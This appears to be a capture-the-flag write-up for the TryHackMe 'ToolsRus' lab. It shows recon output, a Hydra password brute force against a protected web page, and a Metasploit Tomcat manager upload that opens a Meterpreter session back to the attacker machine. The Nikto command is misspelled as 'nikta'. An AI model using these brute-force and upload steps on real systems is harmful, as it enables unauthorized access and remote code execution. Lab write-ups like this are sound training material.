# TRYHACKME : ToolsRus

## RECONNAISSANCE

### NMAP
```
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:32:b3:93:e3:18:bd:22:02:d9:f1:21:83:9c:b2:b9 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCljcaV7xKBzDO6fO1V8nkXaZjBQgQHWUfpo6hDUXK6bunD/+PelElWy0TouOaMIIN+vphdtvYB7pVTCTY97t+ttmmtbMQf06T4C1GsbBZi/etjn4PyKFSUxhl0SReu2Nu8Nna1FL4OLimnE4ZLH1i1EEvtcLUlawDsCEnYlAzGHoFWtMC5HNK6ODouHDOysT4IUTNy6WXfvZee8QroeuhncKI9Gu5tlzH9ctPSLj1O21pH/gGVHm2x0s1oaOrKgjOeYNwnaUbeQudPI4p3Hh9I5bqjG73pqXc/tvZRQVErWgyAyZW86zd+Lonr0+tx1vMjy0qef6GDz60H3SuvIIPt
|   256 3b:b8:05:90:9a:e3:ce:c3:dc:86:43:66:b0:f1:cf:82 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGkJoMZmqLZcNIkGMoaRCh98vAJFmEQmizcrmF5IENwsjmWFMhv7n/N/gAJEEzPEQnv28TrVH3IYoKyksMamLRE=
|   256 9c:15:87:97:63:68:9e:81:c9:f4:fc:03:50:74:47:d7 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEORxDZXH48lA4Ov/yjCiUkO8IPOfo567UfU1HRpZrp/
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
1234/tcp open  http    syn-ack ttl 61 Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
8009/tcp open  ajp13   syn-ack ttl 61 Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### GOBUSTER
```
/.htpasswd            (Status: 403) [Size: 296]
/.htaccess            (Status: 403) [Size: 296]
/guidelines           (Status: 301) [Size: 317] [--> http://10.10.96.219/guidelines/] 
/protected            (Status: 401) [Size: 459]
/server-status        (Status: 403) [Size: 300]
```

### Navigation

**80:** Opening `port 80` tell us that the main site is down for upgrades.

**80/guidelines:** Let us now navigate to the `/guidelines` directory. The page gave us a possible user credential: Bob.

**80/protection:** A diagram box appears which leads to a authentication page.

### HYDRA
```
hydra -l bob -P /usr/share/wordlists/rockyou.txt -t 1 -f  10.10.96.219 http-get /protected/ 
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-17 07:18:47
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking http-get://10.10.96.219:80/protected/
[80][http-get] host: 10.10.96.219   login: bob   password: <RETRIEVE PASSWORD>        // bob uses a cute password                                          
[STATUS] attack finished for 10.10.96.219 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-17 07:19:33
```

After inputting the credentials, the site tells us that the protected page has now moved to a different port.

### PORT 1234

Let's try find this different port. Maybe it's in `port 1234`.

This is where we will use Nikto.

First we access the http page. Then input the previous credential to the host manager page to obtain the number of directories.

### NIKTA
```
$ nikta -h http://[TARGET-IP]:1234/manager/html
// The Apache-Coyote appears somewhere at the start
```

### METASPLOIT

```
$ msfconsole
// use multi/http/tomcat_mgr_upload
// set rhosts [TARGET-IP]
// set rport 1234
// set lhost [ATTACKER-MACHINE]
// set httpPassword <RETRIEVED PASSWORD>
// set httpUsername bob
> run
// once you get the session and meterpreter, retrieve the flag from root directory
```


